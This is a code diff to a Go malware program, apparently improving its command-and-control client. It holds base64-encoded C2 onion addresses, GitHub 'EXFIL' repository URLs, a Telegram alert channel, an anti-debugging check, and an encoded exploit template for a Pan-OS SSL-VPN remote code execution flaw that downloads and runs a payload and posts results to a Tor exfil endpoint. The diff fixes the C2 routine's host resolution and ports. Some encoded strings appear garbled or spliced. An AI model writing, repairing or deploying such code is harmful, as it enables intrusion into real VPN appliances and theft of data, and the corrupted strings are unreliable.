@@ -43,9 +43,9 @@ var (
 	C2Key             = "INJECTED_C2_KEY_B64"
 	C2IV              = "INJECTED_C2_IV_B64"
 	OnionListB64      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u"
-	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHub20vcmVwb3MvQUFQUy1BUEsvQ04yLCBodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL0JCQkItQkIvRVhGSUw="
+	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjIsIGh0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3MvQkJCRS1CTS9FWEZJTA=="
 	TelegramHost      = "dGVsZWdyYW0uYXBpLm9yZw=="
-	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGETVAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1zIC1LIC1YUE9TVCBodHRwczovLyR7VG9yQzJPbmlvbnt9L2V4ZmlsIC1kIEBUL3RtcC8ucHA7 rm /dBXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
+	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aogLSBzcmwtdnBuL3BvcnRhbC9zY3JpcHRzL25ld2JtLnBsCiAgICBoZWFkZXJzOgogICAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1zIC1LIC1YUE9TVCBodHRwczovLyR7VG9yQzJPbmlvbnt9L2V4ZmlsIC1kIEBUL3RtcC8ucHA7 rm /dBXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
 	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
 )
 
@@ -296,15 +296,35 @@ func isTraced() bool {
 	return bytes.Contains(data, []byte("TracerPid:\t"))
 }
 
-// --- TOR-FREE C2: Use Direct Syscalls ---
+// --- FIXED C2: Proper URL & Socket Resolution ---
 func directHTTP(targetURL string, method string, body []byte, headers map[string]string) ([]byte, error) {
 	u, err := neturl.Parse(targetURL)
 	if err != nil {
 		return nil, err
 	}
-	ip := net.ParseIP("185.163.48.113").To4()
+
+	host := u.Hostname()
+	port := u.Port()
+	if port == "" {
+		if u.Scheme == "https" {
+			port = "443"
+		} else {
+			port = "80"
+		}
+	}
+
+	portInt, err := strconv.Atoi(port)
+	if err != nil {
+		return nil, err
+	}
+
+	ips, err := net.LookupIP(host)
+	if err != nil || len(ips) == 0 {
+		return nil, errors.New("failed to resolve host")
+	}
+	ip := ips[0].To4()
 	if ip == nil {
-		return nil, errors.New("invalid IP parsing")
+		return nil, errors.New("invalid IPv4 resolution")
 	}
 	var ipAddr [4]byte
 	copy(ipAddr[:], ip)
@@ -315,15 +335,17 @@ func directHTTP(targetURL string, method string, body []byte, headers map[string
 	}
 	defer unix.Close(sockfd)
 
-	addr := &unix.SockaddrInet4{Port: 443, Addr: ipAddr}
+	addr := &unix.SockaddrInet4{Port: portInt, Addr: ipAddr}
 	if err := unix.Connect(sockfd, addr); err != nil {
 		return nil, err
 	}
 
-	host := u.Hostname()
 	path := u.Path
 	if path == "" {
 		path = "/"
+	}
+	if u.RawQuery != "" {
+		path += "?" + u.RawQuery
 	}
 
 	var buf bytes.Buffer
@@ -721,7 +743,7 @@ func telegramAlert(message string) {
 	}
 	host, _ := base64.StdEncoding.DecodeString(TelegramHost)
 	endpoint := fmt.Sprintf("https://%s/bot%s/sendMessage", host, token)
-	
+
 	payload := neturl.Values{}
 	payload.Set("chat_id", chatID)
 	payload.Set("text", message)
